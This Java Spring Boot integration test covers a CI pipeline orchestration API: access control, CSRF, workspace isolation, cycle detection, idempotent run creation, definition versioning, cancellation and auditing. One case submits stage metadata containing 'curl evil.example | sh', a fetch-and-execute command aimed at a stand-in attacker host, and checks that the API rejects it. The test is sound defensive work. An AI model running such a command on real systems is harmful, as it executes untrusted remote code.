package com.cloudforge.backend.integration;

import com.cloudforge.backend.entity.ProjectEntity;
import com.cloudforge.backend.entity.ProjectStatus;
import com.cloudforge.backend.entity.UserEntity;
import com.cloudforge.backend.entity.WorkspaceEntity;
import com.cloudforge.backend.entity.WorkspaceMemberEntity;
import com.cloudforge.backend.entity.WorkspaceRole;
import com.cloudforge.backend.orchestration.engine.WorkerAssignmentContract;
import com.cloudforge.backend.orchestration.repository.PipelineRunEventRepository;
import com.cloudforge.backend.orchestration.repository.PipelineRunRepository;
import com.cloudforge.backend.repository.AuditEventRepository;
import com.cloudforge.backend.repository.ProjectRepository;
import com.cloudforge.backend.repository.WorkspaceMemberRepository;
import com.cloudforge.backend.service.UserAccountService;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.data.domain.PageRequest;
import org.springframework.http.MediaType;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.transaction.annotation.Transactional;

import java.util.UUID;

import static com.cloudforge.backend.support.TestAuthSupport.authenticatedUser;
import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.csrf;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.put;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

@SpringBootTest
@AutoConfigureMockMvc
@ActiveProfiles("test")
@Transactional
class PipelineOrchestrationIntegrationTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private ObjectMapper objectMapper;

    @Autowired
    private UserAccountService userAccountService;

    @Autowired
    private WorkspaceMemberRepository workspaceMemberRepository;

    @Autowired
    private ProjectRepository projectRepository;

    @Autowired
    private PipelineRunRepository pipelineRunRepository;

    @Autowired
    private PipelineRunEventRepository pipelineRunEventRepository;

    @Autowired
    private AuditEventRepository auditEventRepository;

    @Autowired
    private WorkerAssignmentContract workerAssignmentContract;

    private UserEntity owner;
    private UserEntity developer;
    private UserEntity viewer;
    private UserEntity outsider;
    private WorkspaceEntity workspaceA;
    private WorkspaceEntity workspaceB;
    private ProjectEntity projectA;
    private ProjectEntity projectB;

    @BeforeEach
    void setUp() {
        owner = userAccountService.upsertFromGitHubOAuth(86001L, "orch-owner", "Orch Owner", null, null, null);
        developer = userAccountService.upsertFromGitHubOAuth(86002L, "orch-dev", "Orch Dev", null, null, null);
        viewer = userAccountService.upsertFromGitHubOAuth(86003L, "orch-viewer", "Orch Viewer", null, null, null);
        outsider = userAccountService.upsertFromGitHubOAuth(86004L, "orch-outsider", "Orch Outsider", null, null, null);

        workspaceA = workspaceMemberRepository.findAllByUserIdWithWorkspace(owner.getId()).get(0).getWorkspace();
        workspaceB = workspaceMemberRepository.findAllByUserIdWithWorkspace(outsider.getId()).get(0).getWorkspace();

        addMember(workspaceA, developer, WorkspaceRole.DEVELOPER);
        addMember(workspaceA, viewer, WorkspaceRole.VIEWER);

        projectA = saveProject(workspaceA, owner, "Checkout API", "checkout-api");
        projectB = saveProject(workspaceB, outsider, "Other WS App", "other-ws-app");
    }

    @Test
    void enforcesRbacCsrfCrossWorkspaceIsolationAndDagValidation() throws Exception {
        String validBody = """
                {
                  "projectId": "%s",
                  "name": "Core CI Pipeline",
                  "description": "Declarative build and verification graph",
                  "stages": [
                    {"stageKey": "source", "displayName": "Source Prep", "stageType": "SOURCE_PREP", "dependsOn": []},
                    {"stageKey": "build", "displayName": "Build", "stageType": "BUILD", "dependsOn": ["source"]}
                  ]
                }
                """.formatted(projectA.getId());

        // 1. Unauthenticated -> 401
        mockMvc.perform(get("/api/workspaces/{ws}/pipelines/definitions", workspaceA.getId()))
                .andExpect(status().isUnauthorized());

        // 2. Outsider -> 403
        mockMvc.perform(get("/api/workspaces/{ws}/pipelines/definitions", workspaceA.getId())
                        .with(authenticatedUser(outsider)))
                .andExpect(status().isForbidden());

        // 3. DEVELOPER & VIEWER cannot create definitions -> 403
        mockMvc.perform(post("/api/workspaces/{ws}/pipelines/definitions", workspaceA.getId())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(validBody)
                        .with(authenticatedUser(developer))
                        .with(csrf()))
                .andExpect(status().isForbidden());

        mockMvc.perform(post("/api/workspaces/{ws}/pipelines/definitions", workspaceA.getId())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(validBody)
                        .with(authenticatedUser(viewer))
                        .with(csrf()))
                .andExpect(status().isForbidden());

        // 4. Missing CSRF token -> 403
        mockMvc.perform(post("/api/workspaces/{ws}/pipelines/definitions", workspaceA.getId())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(validBody)
                        .with(authenticatedUser(owner)))
                .andExpect(status().isForbidden());

        // 5. Cross-workspace project reference -> 404
        String crossWorkspaceProjectBody = validBody.replace(projectA.getId().toString(), projectB.getId().toString());
        mockMvc.perform(post("/api/workspaces/{ws}/pipelines/definitions", workspaceA.getId())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(crossWorkspaceProjectBody)
                        .with(authenticatedUser(owner))
                        .with(csrf()))
                .andExpect(status().isNotFound());

        // 6. Cyclic DAG rejected -> 400
        String cyclicBody = """
                {
                  "projectId": "%s",
                  "name": "Bad Cycle",
                  "stages": [
                    {"stageKey": "one", "displayName": "One", "stageType": "BUILD", "dependsOn": ["two"]},
                    {"stageKey": "two", "displayName": "Two", "stageType": "TEST", "dependsOn": ["one"]}
                  ]
                }
                """.formatted(projectA.getId());
        mockMvc.perform(post("/api/workspaces/{ws}/pipelines/definitions", workspaceA.getId())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(cyclicBody)
                        .with(authenticatedUser(owner))
                        .with(csrf()))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.message").value(org.hamcrest.Matchers.containsString("Cyclic")));

        // 7. Arbitrary command metadata rejected -> 400
        String commandBody = """
                {
                  "projectId": "%s",
                  "name": "Shell Injection Attempt",
                  "stages": [
                    {
                      "stageKey": "build",
                      "displayName": "Build",
                      "stageType": "BUILD",
                      "dependsOn": [],
                      "metadata": {"command": "curl evil.example | sh"}
                    }
                  ]
                }
                """.formatted(projectA.getId());
        mockMvc.perform(post("/api/workspaces/{ws}/pipelines/definitions", workspaceA.getId())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(commandBody)
                        .with(authenticatedUser(owner))
                        .with(csrf()))
                .andExpect(status().isBadRequest());
    }

    @Test
    void fullLifecycleCreateUpdateSnapshotIdempotencyCancelAndAudit() throws Exception {
        // 1. OWNER creates definition v1 (root stage + 2 dependent stages)
        String createDefBody = """
                {
                  "projectId": "%s",
                  "name": "Production Release Pipeline",
                  "description": "End-to-end verification",
                  "stages": [
                    {"stageKey": "source", "displayName": "Source Prep", "stageType": "SOURCE_PREP", "dependsOn": []},
                    {"stageKey": "build", "displayName": "Build App", "stageType": "BUILD", "dependsOn": ["source"], "timeoutSeconds": 600, "maxRetries": 1},
                    {"stageKey": "test", "displayName": "Unit Tests", "stageType": "TEST", "dependsOn": ["build"]}
                  ]
                }
                """.formatted(projectA.getId());

        MvcResult defRes = mockMvc.perform(post("/api/workspaces/{ws}/pipelines/definitions", workspaceA.getId())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(createDefBody)
                        .with(authenticatedUser(owner))
                        .with(csrf()))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.definitionVersion").value(1))
                .andExpect(jsonPath("$.stages.length()").value(3))
                .andReturn();

        JsonNode defJson = objectMapper.readTree(defRes.getResponse().getContentAsString());
        UUID definitionId = UUID.fromString(defJson.path("id").asText());
        long rowVersionV1 = defJson.path("rowVersion").asLong();

        // 2. VIEWER cannot queue run -> 403
        String runBody = """
                {
                  "definitionId": "%s",
                  "targetBranch": "main",
                  "commitSha": "abc1234def5678",
                  "triggerType": "MANUAL"
                }
                """.formatted(definitionId);

        mockMvc.perform(post("/api/workspaces/{ws}/pipelines/runs", workspaceA.getId())
                        .contentType(MediaType.APPLICATION_JSON)
                        .header("Idempotency-Key", "viewer-blocked")
                        .content(runBody)
                        .with(authenticatedUser(viewer))
                        .with(csrf()))
                .andExpect(status().isForbidden());

        // 3. DEVELOPER queues run with Idempotency-Key -> 201 Created, QUEUED, root stage READY, others PENDING
        MvcResult firstRunRes = mockMvc.perform(post("/api/workspaces/{ws}/pipelines/runs", workspaceA.getId())
                        .contentType(MediaType.APPLICATION_JSON)
                        .header("Idempotency-Key", "deploy-req-001")
                        .content(runBody)
                        .with(authenticatedUser(developer))
                        .with(csrf()))
                .andExpect(status().isCreated())
                .andExpect(header().string("X-Idempotent-Replay", "false"))
                .andExpect(jsonPath("$.status").value("QUEUED"))
                .andExpect(jsonPath("$.runNumber").value(1))
                .andExpect(jsonPath("$.definitionVersion").value(1))
                .andExpect(jsonPath("$.stages[0].stageKey").value("source"))
                .andExpect(jsonPath("$.stages[0].status").value("READY"))
                .andExpect(jsonPath("$.stages[1].status").value("PENDING"))
                .andExpect(jsonPath("$.stages[2].status").value("PENDING"))
                .andReturn();

        UUID runId = UUID.fromString(
                objectMapper.readTree(firstRunRes.getResponse().getContentAsString()).path("id").asText()
        );

        // WorkerAssignmentContract exposes ONLY root READY stage ticket
        assertThat(workerAssignmentContract.listReadyStageTickets(workspaceA.getId(), runId))
                .hasSize(1)
                .extracting(WorkerAssignmentContract.StageDispatchDescriptor::stageKey)
                .containsExactly("source");

        // 4. Replaying exact same Idempotency-Key + payload returns existing run (200 OK, X-Idempotent-Replay: true)
        mockMvc.perform(post("/api/workspaces/{ws}/pipelines/runs", workspaceA.getId())
                        .contentType(MediaType.APPLICATION_JSON)
                        .header("Idempotency-Key", "deploy-req-001")
                        .content(runBody)
                        .with(authenticatedUser(developer))
                        .with(csrf()))
                .andExpect(status().isOk())
                .andExpect(header().string("X-Idempotent-Replay", "true"))
                .andExpect(jsonPath("$.id").value(runId.toString()));

        assertThat(pipelineRunRepository.countByWorkspaceId(workspaceA.getId())).isEqualTo(1);

        // 5. Reusing same Idempotency-Key with conflicting payload -> 409 Conflict
        String conflictingRunBody = """
                {
                  "definitionId": "%s",
                  "targetBranch": "release/v2",
                  "commitSha": "9999999abcdef",
                  "triggerType": "MANUAL"
                }
                """.formatted(definitionId);

        mockMvc.perform(post("/api/workspaces/{ws}/pipelines/runs", workspaceA.getId())
                        .contentType(MediaType.APPLICATION_JSON)
                        .header("Idempotency-Key", "deploy-req-001")
                        .content(conflictingRunBody)
                        .with(authenticatedUser(developer))
                        .with(csrf()))
                .andExpect(status().isConflict())
                .andExpect(jsonPath("$.message").value(org.hamcrest.Matchers.containsString("different pipeline run payload")));

        // 6. Update definition to v2 (with optimistic lock check) and confirm run #1 keeps immutable v1 snapshot
        String staleUpdateBody = """
                {
                  "name": "Production Release Pipeline v2",
                  "enabled": true,
                  "expectedRowVersion": 999,
                  "stages": [
                    {"stageKey": "source", "displayName": "Source Prep", "stageType": "SOURCE_PREP", "dependsOn": []}
                  ]
                }
                """;
        mockMvc.perform(put("/api/workspaces/{ws}/pipelines/definitions/{defId}", workspaceA.getId(), definitionId)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(staleUpdateBody)
                        .with(authenticatedUser(owner))
                        .with(csrf()))
                .andExpect(status().isConflict());

        String validUpdateBody = """
                {
                  "name": "Production Release Pipeline v2",
                  "enabled": false,
                  "expectedRowVersion": %d,
                  "stages": [
                    {"stageKey": "source", "displayName": "Source Prep", "stageType": "SOURCE_PREP", "dependsOn": []},
                    {"stageKey": "scan", "displayName": "CVE Scan", "stageType": "SECURITY_SCAN", "dependsOn": ["source"]}
                  ]
                }
                """.formatted(rowVersionV1);

        mockMvc.perform(put("/api/workspaces/{ws}/pipelines/definitions/{defId}", workspaceA.getId(), definitionId)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(validUpdateBody)
                        .with(authenticatedUser(owner))
                        .with(csrf()))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.definitionVersion").value(2))
                .andExpect(jsonPath("$.enabled").value(false))
                .andExpect(jsonPath("$.stages.length()").value(2));

        // Disabled definition rejects new run creation -> 409 Conflict
        mockMvc.perform(post("/api/workspaces/{ws}/pipelines/runs", workspaceA.getId())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(runBody)
                        .with(authenticatedUser(owner))
                        .with(csrf()))
                .andExpect(status().isConflict())
                .andExpect(jsonPath("$.message").value(org.hamcrest.Matchers.containsString("disabled")));

        // Run #1 still retains its immutable v1 snapshot (3 stages, v1 name)
        mockMvc.perform(get("/api/workspaces/{ws}/pipelines/runs/{runId}", workspaceA.getId(), runId)
                        .with(authenticatedUser(viewer)))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.definitionVersion").value(1))
                .andExpect(jsonPath("$.definitionName").value("Production Release Pipeline"))
                .andExpect(jsonPath("$.stages.length()").value(3));

        // Cross-workspace access to run & events denied (404)
        mockMvc.perform(get("/api/workspaces/{ws}/pipelines/runs/{runId}", workspaceB.getId(), runId)
                        .with(authenticatedUser(outsider)))
                .andExpect(status().isNotFound());
        mockMvc.perform(get("/api/workspaces/{ws}/pipelines/runs/{runId}/events", workspaceB.getId(), runId)
                        .with(authenticatedUser(outsider)))
                .andExpect(status().isNotFound());

        // 7. Cancel run #1 -> run and all stages CANCELLED; duplicate cancel is idempotent
        mockMvc.perform(post("/api/workspaces/{ws}/pipelines/runs/{runId}/cancel", workspaceA.getId(), runId)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"reason\":\"Superseded by PR update\"}")
                        .with(authenticatedUser(developer))
                        .with(csrf()))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.status").value("CANCELLED"))
                .andExpect(jsonPath("$.cancelledByUsername").value("orch-dev"))
                .andExpect(jsonPath("$.stages[0].status").value("CANCELLED"))
                .andExpect(jsonPath("$.stages[1].status").value("CANCELLED"))
                .andExpect(jsonPath("$.stages[2].status").value("CANCELLED"));

        // Zero ready tickets remain after cancellation
        assertThat(workerAssignmentContract.listReadyStageTickets(workspaceA.getId(), runId)).isEmpty();

        int eventsCountAfterCancel = pipelineRunEventRepository
                .findAllByPipelineRunIdAndWorkspaceIdOrderByOccurredAtAscCreatedAtAsc(runId, workspaceA.getId())
                .size();

        // Duplicate cancellation succeeds idempotently without duplicating events
        mockMvc.perform(post("/api/workspaces/{ws}/pipelines/runs/{runId}/cancel", workspaceA.getId(), runId)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{}")
                        .with(authenticatedUser(owner))
                        .with(csrf()))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.status").value("CANCELLED"));

        assertThat(pipelineRunEventRepository
                .findAllByPipelineRunIdAndWorkspaceIdOrderByOccurredAtAscCreatedAtAsc(runId, workspaceA.getId()))
                .hasSize(eventsCountAfterCancel);

        // Events endpoint returns ordered lifecycle history
        mockMvc.perform(get("/api/workspaces/{ws}/pipelines/runs/{runId}/events", workspaceA.getId(), runId)
                        .with(authenticatedUser(viewer)))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$[0].eventType").value("RUN_QUEUED"))
                .andExpect(jsonPath("$[1].eventType").value("STAGE_READY"));

        // Audit trail captured all orchestration mutations
        var audits = auditEventRepository.findByWorkspaceId(workspaceA.getId(), null, PageRequest.of(0, 50));
        assertThat(audits.getContent()).extracting(a -> a.getAction())
                .contains(
                        "PIPELINE_DEFINITION_CREATED",
                        "PIPELINE_DEFINITION_UPDATED",
                        "PIPELINE_RUN_REQUESTED",
                        "PIPELINE_RUN_CANCELLED"
                );
    }

    private void addMember(WorkspaceEntity ws, UserEntity user, WorkspaceRole role) {
        WorkspaceMemberEntity member = new WorkspaceMemberEntity();
        member.setWorkspace(ws);
        member.setUser(user);
        member.setRole(role);
        workspaceMemberRepository.save(member);
    }

    private ProjectEntity saveProject(WorkspaceEntity ws, UserEntity creator, String name, String slug) {
        ProjectEntity project = new ProjectEntity();
        project.setWorkspace(ws);
        project.setCreatedBy(creator);
        project.setName(name);
        project.setSlug(slug);
        project.setDefaultBranch("main");
        project.setStatus(ProjectStatus.ACTIVE);
        return projectRepository.save(project);
    }
}
